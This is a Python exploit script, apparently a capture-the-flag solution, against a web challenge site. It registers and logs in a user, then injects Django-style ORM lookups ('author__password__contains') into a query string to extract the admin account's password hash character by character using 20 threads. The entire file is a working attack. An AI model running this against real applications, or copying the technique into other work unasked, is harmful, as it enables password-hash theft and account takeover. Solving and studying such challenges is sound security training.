import requests
import string
import sys
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode

BASE_URL = "https://nosql.web.ingeniums.club"
LOGIN_URL = f"{BASE_URL}/accounts/login/"
REGISTER_URL = f"{BASE_URL}/accounts/register/"
TARGET = f"{BASE_URL}/quotes/"
CHARS = string.ascii_letters + string.digits + "$/=+_"
THREADS = 20

session = requests.Session()

def register(username: str, email: str, password: str):
    response = session.get(REGISTER_URL)
    csrf_token = session.cookies.get("csrftoken")
    if not csrf_token:
        print("[-] Failed to retrieve CSRF token for registration.")
        return False
    
    register_data = {
        "csrfmiddlewaretoken": csrf_token,
        "username": username,
        "email": email,
        "password1": password,
        "password2": password
    }
    headers = {"Referer": REGISTER_URL}
    response = session.post(REGISTER_URL, data=register_data, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Successfully registered {username}.")
        return True
    print("[-] Registration failed.")
    return False

def login(username: str, password: str):
    response = session.get(LOGIN_URL)
    csrf_token = session.cookies.get("csrftoken")
    if not csrf_token:
        print("[-] Failed to retrieve CSRF token.")
        return False
    
    login_data = {
        "username": username,
        "password": password,
        "csrfmiddlewaretoken": csrf_token
    }
    headers = {"Referer": LOGIN_URL}
    response = session.post(LOGIN_URL, data=login_data, headers=headers)
    
    if "sessionid" in session.cookies:
        print(f"[+] Logged in as {username}, Session ID: {session.cookies['sessionid']}")
        return True
    print("[-] Login failed. Check credentials.")
    return False

def worker(username: str, known_dumped: str, c: str) -> tuple[bool, str]:
    query_params = {
        "author__username": username,
        "author__password__contains": known_dumped + c
    }
    query_string = urlencode(query_params)
    
    response = session.get(f"{TARGET}?{query_string}")
    
    return "admin" in response.content.decode(), known_dumped + c

def exploit(username: str):
    dumped_value = "pbkdf2_sha256$"  

    print(f"\r{Fore.GREEN}username: {Fore.BLUE}{Style.BRIGHT}{username}{Style.RESET_ALL}")
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
    sys.stdout.flush()
    
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(worker, [username] * len(CHARS), [dumped_value] * len(CHARS), CHARS)

            for result in futures:
                was_success, test_substring = result
                
                print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{test_substring}{Style.RESET_ALL}", end="")
                sys.stdout.flush()
                
                if was_success:
                    found = True
                    dumped_value = test_substring
                    break
        
        if not found:
            break
    
    print(f"\r{Fore.RED}password: {Fore.YELLOW}{Style.BRIGHT}{dumped_value} {Style.RESET_ALL}")

def main():
    username = "user99"
    email = "user99@gmail.com"
    password = "coolpass69"  
    if not register(username, email, password):
        print("[-] Exiting due to registration failure.")
        return
    if login(username, password):
        exploit("admin")
    else:
        print("[-] Exiting due to failure.")

if __name__ == "__main__":
    main()
